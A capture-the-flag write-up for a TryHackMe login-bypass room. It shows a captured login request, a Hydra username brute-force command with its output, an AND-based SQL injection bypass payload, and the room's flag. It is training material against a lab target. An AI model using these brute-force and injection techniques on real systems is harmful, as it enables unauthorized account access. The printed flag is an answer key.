## Lesson Learned? - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/lessonlearned)

<i>This is a relatively easy machine that tries to teach you a lesson, but perhaps you've already learned the lesson? Let's find out.

Treat this box as if it were a real target and not a CTF.

Get past the login screen and you will find the flag. There are no rabbit holes, no hidden files, just a login page and a flag. Good luck!</i>

**IP: 10.10.55.184**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Authentication Bypass <br>

**Tools Used**: Hydra<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Brute forcing and SQL Injection

- So, I learned my lesson. I tried SQLI multiple times before brute forcing and had to reset the room few times. First brute force the username for login page. Before using Hydra, capture the request with Burp and failed attempt message.

  ```
  Invalid username and password.

  POST / HTTP/1.1
  Host: 10.10.55.184
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 29
  Origin: http://10.10.55.184
  Connection: keep-alive
  Referer: http://10.10.55.184/
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  username=admin&password=admin
  ```


  ```
  hydra -L /seclists/Usernames/xato-net-10-million-usernames.txt -p qwerty 10.10.55.184 http-post-form "/:username=^USER^&password=^PW^:F=Invalid username and password"
  Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  
  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-25 22:50:45
  [DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
  [DATA] attacking http-post-form://10.10.55.184:80/:username=^USER^&password=^PW^:F=Invalid username and password
  [80][http-post-form] host: 10.10.55.184   login: martin   password: qwerty
  [80][http-post-form] host: 10.10.55.184   login: patrick   password: qwerty
  [80][http-post-form] host: 10.10.55.184   login: stuart   password: qwerty
  [80][http-post-form] host: 10.10.55.184   login: marcus   password: qwerty
  [80][http-post-form] host: 10.10.55.184   login: kelly   password: qwerty
  [80][http-post-form] host: 10.10.55.184   login: arnold   password: qwerty
  [80][http-post-form] host: 10.10.55.184   login: Martin   password: qwerty
  [80][http-post-form] host: 10.10.55.184   login: karen   password: qwerty
  [80][http-post-form] host: 10.10.55.184   login: Patrick   password: qwerty
  ```
  
- Now try to login with any of these usernames and you will receive the message `Invalid password.`. So now, we do SQLI. Since I learned my lesson to not use OR operator, we will use AND operator and get the flag.

  ```
  karen' AND '1'='1' -- -
  test
  
  THM{aab02c6b76bb752456a54c80c2d6fb1e}
  Well done! You bypassed the login without deleting the flag!
  If you're confused by this message, you probably didn't even try an SQL injection using something like OR 1=1. Good for you, you didn't need to learn the lesson.
  For everyone else who had to reset the box...lesson learned?
  Using OR 1=1 is risky and should rarely be used in real world engagements. Since it loads all rows of the table, it may not even bypass the login, if the login expects only 1 row to be returned.
  Loading all rows of a table can also cause performance issues on the database. However, the real danger of OR 1=1 is when it ends up in either an UPDATE or DELETE statement, since it will cause the modification or deletion of every row.
  For example, consider that after logging a user in, the application re-uses the username input to update a user's login status: UPDATE users SET online=1 WHERE username='<username>';
  A successful injection of OR 1=1 here would cause every user to appear online. A similar DELETE statement, possibly to delete prior session data, could wipe session data for all users of the application.
  Consider using AND 1=1 as an alternative, with a valid input (in this case a valid username) to test / confirm SQL injection. 
  ```
  
- I LEARNED MY LESSON!

---

## 🏁 Flags

- **Flag**: `THM{aab02c6b76bb752456a54c80c2d6fb1e}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing.`

- What did I learn?
  `I learned my lesson!`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
